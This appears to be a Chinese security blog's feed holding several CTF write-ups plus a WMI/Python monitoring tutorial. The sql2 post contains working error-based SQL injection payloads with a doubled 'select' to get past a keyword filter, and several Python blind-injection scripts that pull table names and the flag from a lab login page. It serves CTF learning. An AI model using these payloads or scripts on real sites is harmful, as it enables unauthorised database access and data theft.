    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>wmi全称为Windows Management Instrumentation，在win10下是一个非常好使的插件，可以用来管理、监控计算机资源。<a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>WMI基于CIMOM，即公共信息模型对象管理器，是一个描述操作系统构成单元的对象数据库。WMI有一组API，因此很多语言都可以对wmi进行相应的调用。<br>windows官方建议使用VB和C#。（但没必要<br>针对WMI的脚本对象编程本质上来将就是针对CIM（Common Information Model，公共信息模型）的编程，WMI的获取与操作的内容都来自于CIM存储库<br>一般使用wql语句来获取想要的内容，wql类似于sql，比如下面这句。<br><code>usagelist = wmi.ExecQuery(r&#39;select IDProcess,Name,PercentProcessorTime from Win32_PerfFormattedData_PerfProc_Process&#39;)</code><br>就可以返回进程id，进程名和他的CPU占用率，非常的好用。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>WMI支持Powershell、Vbscript和C#script，而windows本身也提供了几个UI工具来使用，包括WMIC.exe、WBEMTest.exe和WMI Administrative Tools等。<br>直接在cmd输入wbemtest即可使用WBEMTest<br><img src="/2021/02/23/wmi/1.jpg" alt><br>点击连接，使用root/cimv2的命名空间。多数为windows托管资源建模的类都在其中，包括关于计算机、磁盘、外围设备、文件、文件夹、文件系统、网络组件、操作系统、打印机、进程、安全性、服务、共享、SAM 用户及组，以及更多资源的信息。<br><img src="/2021/02/23/wmi/2.jpg" alt><br>然后我们点选枚举类，啥也不输入，选择递归，即可列出这个命名空间内的各个类。<br><img src="/2021/02/23/wmi/3.jpg" alt><br>当然，对于想要实现的某些特定需求，我们一定要获知具体是那个类在管理他，只有如此才能实现对其操作进而达到目标。这如此多的类，当然需要借助面向google编程技巧才行啦。<br>当然，in case你想完善而全面的了解各个类所控制的资源<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-reference?redirectedfrom=MSDN">WMI Reference</a><br>然而，如果只是这样使用UI或者是命令行工具，显然是无法满足我们这些小可爱的需求的，那么我们要怎样使用脚本去操作wmi呢？</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>当然首先建议你去用VB或者.NET编程实现，毕竟官方原生支持，相关文档也会多一点。不过python的好处不正是如果有大佬做了相应的包并且还挺好用的话，像我一样的菜逼就能非常灵动的使用了吗（误<br>言归正传，首先你得安装wmi模块，这个模块基本上是从包装了一下的pywin32模块。用pip instal都可以简单的意见安装。建议都装了。<br>然后就很简单了<br>比如我编写的监控CPU信息的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wmi</span><br><span class="line">wmi=wmi.WMI()</span><br><span class="line">usagelist = wmi.ExecQuery(<span class="string">r&#x27;select IDProcess,Name,PercentProcessorTime from Win32_PerfFormattedData_PerfProc_Process&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> usagelist:</span><br><span class="line">    <span class="keyword">if</span> item.PercentProcessorTime &gt; <span class="number">70</span> :</span><br><span class="line">        print(<span class="built_in">str</span>(item.IdProcess)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(item.Name)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(item.PercentProcessorTime))</span><br></pre></td></tr></table></figure><p>当然，如果你用pywin32的话，只需要把<code>wmi=wmi.WMI()</code>这句变成<code>wmi=pywin32.GetObject(r&#39;winmgmts:/root/cimv2&#39;)</code>即可</p><p>参考：<br><a href="https://www.cnblogs.com/ceachy/archive/2013/03/22/WMI_Usage.html">https://www.cnblogs.com/ceachy/archive/2013/03/22/WMI_Usage.html</a><br><a href="https://wenku.baidu.com/view/dfbf88f14693daef5ef73d12.html">https://wenku.baidu.com/view/dfbf88f14693daef5ef73d12.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;wmi全称为Windows Management Instrumentation，在win10下是一个非常好使的插件，可以用来管理、监控计算机资源。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_get_started_3dsctf_2016</title>
    <link href="https://blog.pillar.fun/2021/01/30/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-get-started-3dsctf-2016/"/>
    <id>https://blog.pillar.fun/2021/01/30/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-get-started-3dsctf-2016/</id>
    <published>2021-01-30T09:46:45.000Z</published>
    <updated>2023-02-27T11:04:42.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>首先checksec</p><p><img src="/2021/01/30/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-get-started-3dsctf-2016/1677491624584.png" alt="1677491624584"></p><p>拖进IDA看看</p><p>输出一个西班牙语，然后就gets，然后return，需要栈溢出劫持控制流。</p><p><img src="/2021/01/30/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-get-started-3dsctf-2016/1677493727296.png" alt="1677493727296"></p><p>可以看到在main上面有一个get_flag函数</p><p><img src="/2021/01/30/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-get-started-3dsctf-2016/1677493821276.png" alt="1677493821276"></p><p><img src="/2021/01/30/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-get-started-3dsctf-2016/1677493841403.png" alt="1677493841403"></p><p>getflag函数中有两个实参a1，a2，四个本地变量v2-v5</p><p>所以我们在溢出覆盖返回地址之后，要进一步设置getflag的栈空间</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-random</title>
    <link href="https://blog.pillar.fun/2021/01/30/i%E6%98%A5%E7%A7%8B-random/"/>
    <id>https://blog.pillar.fun/2021/01/30/i%E6%98%A5%E7%A7%8B-random/</id>
    <published>2021-01-30T08:34:27.000Z</published>
    <updated>2021-02-23T17:20:30.446Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=4771">点击这里去答题</a></p><a id="more"></a><p>打开可以看到一个.pyo的文件和一个.enc的文件<br><img src="/2021/01/30/i%E6%98%A5%E7%A7%8B-random/1.jpg" alt><br>其中.pyo是python编译后的字节码文件，可以使用<a href="https://sourceforge.net/projects/easypythondecompiler/">EasyPythonDecomplier</a>进行反编译，获取对应的python代码。同时也有在线工具可以用。<br>而.enc应该是经过了encrypt加密后的结果，内容是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">208 140 149 236 189 77 193 104 202 184 97 236 148 202 244 199 77 122 113 </span><br></pre></td></tr></table></figure><p>将.pyo反编译，可以得到这样的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: encrypt.py</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, sqrt</span><br><span class="line">_ = <span class="string">&#x27;&#x27;</span></span><br><span class="line">__ = <span class="string">&#x27;_&#x27;</span></span><br><span class="line">____ = [ <span class="built_in">ord</span>(___) <span class="keyword">for</span> ___ <span class="keyword">in</span> __ ]</span><br><span class="line">_____ = randint(<span class="number">65</span>, <span class="built_in">max</span>(____)) * <span class="number">255</span></span><br><span class="line"><span class="keyword">for</span> ___ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(__)):</span><br><span class="line">    _ += <span class="built_in">str</span>(<span class="built_in">int</span>(floor(<span class="built_in">float</span>(_____ + ____[___]) / <span class="number">2</span> + sqrt(_____ * ____[___])) % <span class="number">255</span>)) + <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> _</span><br></pre></td></tr></table></figure><p>一样长的下划线代表一个变量，可以稍微优化一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, sqrt</span><br><span class="line">emcrypted = <span class="string">&#x27;&#x27;</span></span><br><span class="line">plain = <span class="string">&#x27;_&#x27;</span></span><br><span class="line">plain_ascii = [ <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain ]</span><br><span class="line">randI = randint(<span class="number">65</span>, <span class="built_in">max</span>(plain_ascii)) * <span class="number">255</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">    emcrypted += <span class="built_in">str</span>(<span class="built_in">int</span>(floor(<span class="built_in">float</span>(randI + plain_ascii[i]) / <span class="number">2</span> + sqrt(randI * plain_ascii[i])) % <span class="number">255</span>)) + <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> emcrypted</span><br></pre></td></tr></table></figure><p>可以看出来，加密步骤如下<br>首先将明文转为对应的ascii码表示<br>然后再从65~max（plain_ascii)中随机选取一个整数再乘以255得到randI<br>然后对每个明文的ascii码i进行如下操作<br>1 加上randI，除以二<br>2 乘以randI，开平方，再模255<br>3 把1和2两步的结果加起来，强转整型</p><p>由于第三步强转整型是会有数据丢失的，所以没法直接逆算法求明文，但是他只rand了一次，并且rand的取值也没多少，所以直接暴破即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor, sqrt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ANSInum = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>)]</span><br><span class="line">flagEnc=[<span class="number">208</span>,<span class="number">140</span>,<span class="number">149</span>,<span class="number">236</span>,<span class="number">189</span>,<span class="number">77</span>,<span class="number">193</span>,<span class="number">104</span>,<span class="number">202</span>,<span class="number">184</span>,<span class="number">97</span>,<span class="number">236</span>,<span class="number">148</span>,<span class="number">202</span>,<span class="number">244</span>,<span class="number">199</span>,<span class="number">77</span>,<span class="number">122</span>,<span class="number">113</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>*<span class="number">255</span>,<span class="number">127</span>*<span class="number">255</span>,<span class="number">255</span>):</span><br><span class="line">    tmpDict=&#123;&#125; <span class="comment">#解码表</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ANSInum)):</span><br><span class="line">        tmpInt = <span class="built_in">int</span>(floor(<span class="built_in">float</span>(k + ANSInum[i]) / <span class="number">2</span> + sqrt(k * ANSInum[i])) % <span class="number">255</span>)</span><br><span class="line">        tmpDict[tmpInt] = <span class="built_in">chr</span>(ANSInum[i])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=<span class="string">&#x27;&#x27;</span>.join([tmpDict[i] <span class="keyword">for</span> i <span class="keyword">in</span> flagEnc])</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (k/<span class="number">255</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/30/i%E6%98%A5%E7%A7%8B-random/2.jpg" alt><br>甚至只有一个结果=-=</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=4771&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>《从0到1：CTFer成长之路》Web之sql2</title>
    <link href="https://blog.pillar.fun/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/"/>
    <id>https://blog.pillar.fun/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/</id>
    <published>2021-01-29T11:16:33.000Z</published>
    <updated>2021-01-30T08:47:08.027Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>我没找到他的题目idXD</p><a id="more"></a><p><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/1.jpg" alt></p><h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p>打开题目提示去login.php看。<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/2.jpg" alt><br>查看源代码，提示url加?tips=1开启报错，用burpsuit可以查看，立刻想到使用报错注入<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/3.jpg" alt><br>同时先简单尝试一下，发现账号存在字符注入，用单引号闭合（1’ or 1=1和1’ and 1=2）<br>使用burp，如下<br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/4.jpg" alt><br>当然，借助右边回应是账号不存在还是账号错误可以进行布尔注入，但是既然有了提示，为什么不用呢？<br>使用extractvalue报错注入，得到database为note<br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;\~&#39;,(select database()))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/5.jpg" alt><br>然后理所应当接下来操作是information_schema三连，但是他老说我语法有错，我看了半天直接心态小崩，搁网上找了找别人的wp，然后发现他过滤了select……于是双写select来information_schema三连。<br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;))))#&amp;pass=456</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/6.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(seselectlect group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/7.jpg" alt><br><code>1&#39; or 1=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(selselectect flag from note.fl4g))))#</code><br><img src="/2021/01/29/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8BWeb%E4%B9%8Bsql2/8.jpg" alt></p><p>然后我还顺着我看的wp的做法整了一遍布尔注入。<br>爆数据库长度</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for i in range(30):</span><br><span class="line">    key &#x3D; &quot;admin&#39; and &quot; + &quot;(length(database())&#x3D;&quot; + str(i) + &quot;)#&quot;</span><br><span class="line">    data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;123&#39;&#125;</span><br><span class="line">    r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">    #print(r)</span><br><span class="line">    if right in str(r):</span><br><span class="line">        print(&#39;the length of database is %s&#39; %i)</span><br></pre></td></tr></table></figure><p>爆数据库名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">length&#x3D;4</span><br><span class="line">name&#x3D;&#39;&#39;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for j in range(1,length+1):</span><br><span class="line">    for i in range(65,123):</span><br><span class="line">        key &#x3D; &quot;admin&#39;&quot;+&quot; and (ascii(substr(database(),%d,1))&#x3D;%d)#&quot;%(j,i)</span><br><span class="line">        data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">        r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">        if right in str(r):</span><br><span class="line">            name+&#x3D;chr(i)</span><br><span class="line">            print(name)</span><br></pre></td></tr></table></figure><p>爆表长</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for i in range(30):</span><br><span class="line">    key &#x3D; &quot;admin&#39; and &quot; + &quot;length((sselectelect table_name FROM information_schema.tables WHERE table_schema&#x3D;0x6e6f7465 limit 0,1))&#x3D;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">    data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">    r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">    #print(r)</span><br><span class="line">    if right in str(r):</span><br><span class="line">        print(&#39;the length of table is %s&#39; %i)</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">length&#x3D;4</span><br><span class="line">name&#x3D;&#39;&#39;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for j in range(1,length+1):</span><br><span class="line">    for i in range(48,123):</span><br><span class="line">        #key &#x3D; &quot;admin%1$&#39; and &quot; + &quot;(substr(database(),0,1)&#x3D;&quot; + i + &quot;)#&quot;</span><br><span class="line">        #key &#x3D; &quot;admin%1$&#39; and &quot; + &quot;(substr(database(),&quot;+str(j)+&quot;,1)&#x3D;&quot; + i + &quot;)#&quot;</span><br><span class="line">        key &#x3D; &quot;admin&#39;&quot;+&quot; and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema&#x3D;0x6e6f7465 limit 0,1),%d,1))&#x3D;%d)#&quot;%(j,i)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">    </span><br><span class="line">    &#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">        r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">        if right in str(r):</span><br><span class="line">            name+&#x3D;chr(i)</span><br><span class="line">            print(name)</span><br></pre></td></tr></table></figure><p>爆列长</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for i in range(30):</span><br><span class="line">    key &#x3D; &quot;admin&#39; and &quot; + &quot;length((seselectlect column_name FROM information_schema.columns WHERE table_name&#x3D;0x666c3467 limit 0,1))&#x3D;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">    data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">    r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">    #print(r)</span><br><span class="line">    if right in str(r):</span><br><span class="line">        print(&#39;the length of column is %s&#39; %i)</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">length&#x3D;4</span><br><span class="line">name&#x3D;&#39;&#39;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for j in range(1,length+1):</span><br><span class="line">    for i in range(48,123):</span><br><span class="line">        #key &#x3D; &quot;admin%1$&#39; and &quot; + &quot;(substr(database(),0,1)&#x3D;&quot; + i + &quot;)#&quot;</span><br><span class="line">        #key &#x3D; &quot;admin%1$&#39; and &quot; + &quot;(substr(database(),&quot;+str(j)+&quot;,1)&#x3D;&quot; + i + &quot;)#&quot;</span><br><span class="line">        key &#x3D; &quot;admin&#39;&quot;+&quot; and (ascii(substr((seselectlect  column_name FROM information_schema.columns WHERE table_name&#x3D;0x666c3467 limit 0,1),%d,1))&#x3D;%d)#&quot;%(j,i)</span><br><span class="line">        data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">        r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">        if right in str(r):</span><br><span class="line">            name+&#x3D;chr(i)</span><br><span class="line">            print(name)</span><br></pre></td></tr></table></figure><p>爆flag长</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for i in range(60):</span><br><span class="line">    key &#x3D; &quot;admin&#39; and &quot; + &quot;length((seselectlect flag FROM fl4g limit 0,1))&#x3D;&quot; + str(i) + &quot;#&quot;</span><br><span class="line">    data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">    r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">    #print(r)</span><br><span class="line">    if right in str(r):</span><br><span class="line">        print(&#39;the length of column is %s&#39; %i)</span><br></pre></td></tr></table></figure><p>爆flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">dic &#x3D; string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+&#123;&#125;-&#x3D;&quot;</span><br><span class="line">length&#x3D;26</span><br><span class="line">name&#x3D;&#39;&#39;</span><br><span class="line">right &#x3D; &#39;8bef&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;eci-2ze3zvy43f4mvrfyf12o.cloudeci1.ichunqiu.com&#x2F;login.php&#39;</span><br><span class="line">for j in range(1,length+1):</span><br><span class="line">    for i in dic:</span><br><span class="line">        key &#x3D; &quot;admin&#39;&quot;+&quot; and (ascii(substr((sselectelect flag FROM fl4g limit 0,1),%d,1))&#x3D;&quot;%j+str(ord(i))+&quot;)#&quot;</span><br><span class="line">        data &#x3D; &#123;&#39;name&#39;:key, &#39;pass&#39;:&#39;111&#39;&#125;</span><br><span class="line">        r &#x3D; requests.post(url, data&#x3D;data).text</span><br><span class="line">        if right in str(r):</span><br><span class="line">            name+&#x3D;i</span><br><span class="line">            print(name)</span><br></pre></td></tr></table></figure><p>参考<br><a href="https://www.codetd.com/article/11976293">https://www.codetd.com/article/11976293</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;我没找到他的题目idXD&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="web" scheme="https://blog.pillar.fun/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-Pretty_good_privacy</title>
    <link href="https://blog.pillar.fun/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/"/>
    <id>https://blog.pillar.fun/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/</id>
    <published>2021-01-28T10:05:27.000Z</published>
    <updated>2021-01-28T10:40:34.803Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=2333">点击这里去答题</a></p><a id="more"></a><p><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/1.jpg" alt></p><h1 id="pretty-good-privacy"><a href="#pretty-good-privacy" class="headerlink" title="pretty good privacy"></a>pretty good privacy</h1><p>看到题目，立刻想到要用pgp。<br>我没有，因此去<a href="https://www.gnupg.org/download/index.html">https://www.gnupg.org/download/index.html</a> 下载一个Gpg4win。安装的时候默认安装的模块都安装了就完事了。</p><p>解压题目，可以看到一个这<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/2.jpg" alt><br>打开doc文件，可以看到这样的内容<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/3.jpg" alt><br>当然你得先开了word的显示隐藏内容的选项才能看到下面那个TrueCrypt的内容。<br>然后全选，设置字体颜色为黑色，可以看到这个藏比还多藏了一点，但不多。（？）<br><img src="/2021/01/28/i%E6%98%A5%E7%A7%8B-Pretty-good-privacy/4.jpg" 